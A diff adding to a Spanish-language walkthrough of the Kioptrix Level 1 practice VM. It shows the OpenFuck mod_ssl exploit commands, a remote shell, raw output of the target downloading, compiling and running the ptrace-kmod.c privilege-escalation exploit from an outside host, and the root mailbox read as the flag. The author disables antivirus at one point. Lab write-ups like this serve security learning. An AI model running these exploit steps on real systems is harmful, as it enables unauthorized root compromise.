@@ -247,7 +247,7 @@ Finalmente al googlear 5 minutos aparecieron dos páginas que me ayudaron:
     3. It's Compile Time
     : gcc -o OpenFuck OpenFuck.c -lcrypto
 
-    4.Running the Exploit
+    4. Running the Exploit
     : ./OpenFuck
 
 ```console
@@ -276,8 +276,146 @@ Acá es donde se vuelve importante la versión de sistema operativo y Apache que
 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
 ```
 
-Voy a ir por la primera, el comando sería:
+Voy a ir por la primera, el comando es:
 
 >**`./OpenFuck 0x6a 100.0.0.107 -c 50`**
+
+Después de 20 intentos me pasé a la segunda opción:
+
+>**`./OpenFuck 0x6b 100.0.0.107 -c 50`**
+
+
+20 intentos después y logré lo siguiente:
+
+```console
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$
+exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304-
+--21:46:59--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 959 [text/html]
+
+    0K                                                       100% @ 936.52 KB/s
+
+21:47:05 (936.52 KB/s) - `ptrace-kmod.c' saved [959/959]
+
+ptrace-kmod.c:1: parse error before `<'
+ptrace-kmod.c:5: nondigits in number and not hexadecimal
+ptrace-kmod.c:5: nondigits in number and not hexadecimal
+ptrace-kmod.c:5: nondigits in number and not hexadecimal
+ptrace-kmod.c:5: nondigits in number and not hexadecimal
+ptrace-kmod.c:6: syntax error before `{'
+ptrace-kmod.c:6: nondigits in number and not hexadecimal
+ptrace-kmod.c:6: nondigits in number and not hexadecimal
+ptrace-kmod.c:7: syntax error before `{'
+ptrace-kmod.c:7: nondigits in number and not hexadecimal
+ptrace-kmod.c:7: nondigits in number and not hexadecimal
+ptrace-kmod.c:8: syntax error before `{'
+ptrace-kmod.c:8: nondigits in number and not hexadecimal
+ptrace-kmod.c:8: nondigits in number and not hexadecimal
+ptrace-kmod.c:9: nondigits in number and not hexadecimal
+ptrace-kmod.c:9: nondigits in number and not hexadecimal
+ptrace-kmod.c:9: nondigits in number and not hexadecimal
+ptrace-kmod.c:9: nondigits in number and not hexadecimal
+bash: ./p: No such file or directory
+bash-2.05$
+```
+
+Genial, a ver si se consigue el root...
+
+```console
+bash-2.05$ whoami
+whoami
+apache
+```
+
+Claro que no, estoy con el usuario apache. Este problema es porque el epxloit, para ser completado, se tiene que descargar un archivo llamado `ptrace-kmod.c` más arriba se ven las advertencias.
+
+Existen dos opciones para hacer que funcione, se descarga manualmente el código fuente o se modifica el link de descarga y se recompila OpenFuck. Por el momento quiero descargarlo de manera manual y compilarlo con la linea de comandos limitada que logré.
+
+la URL que funcionó es la siguiente `http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c`
+
+Ok. nada de eso funcionó. Resulta que el AV de mi PC estaba tomando como malicioso el link de descarga del código fuente, lo desactivé y más o menos funcionó:
+
+```console
+Connection... 50 of 50
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8050
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$
+exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304-
+--22:24:53--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--22:24:54--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           => `ptrace-kmod.c'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+22:24:54 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
+
+/usr/bin/ld: cannot open output file p: Permission denied
+collect2: ld returned 1 exit status
+^[[A^[[B
+/bin/sh: : command not found
+whoami
+**root**
+```
+
+
+Ahora solo resta encontrar la bandera...
+
+>**`cat /var/mail/root`**
+
+```console
+From root  Sat Sep 26 11:42:10 2009
+Return-Path: <root@kioptix.level1>
+Received: (from root@localhost)
+        by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
+        for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
+Date: Sat, 26 Sep 2009 11:42:10 -0400
+From: root <root@kioptix.level1>
+Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won't be as easy...
+
+From root  Sun Feb  2 19:17:15 2020
+Return-Path: <root@kioptrix.level1>
+Received: (from root@localhost)
+        by kioptrix.level1 (8.11.6/8.11.6) id 0130HFP01124
+        for root; Sun, 2 Feb 2020 19:17:15 -0500
+Date: Sun, 2 Feb 2020 19:17:15 -0500
+From: root <root@kioptrix.level1>
+Message-Id: <202002030017.0130HFP01124@kioptrix.level1>
+To: root@kioptrix.level1
+Subject: LogWatch for kioptrix.level1
+
+
+
+ ################## LogWatch 2.1.1 Begin #####################
+
+
+ ###################### LogWatch End #########################
+```
+
+
 
 
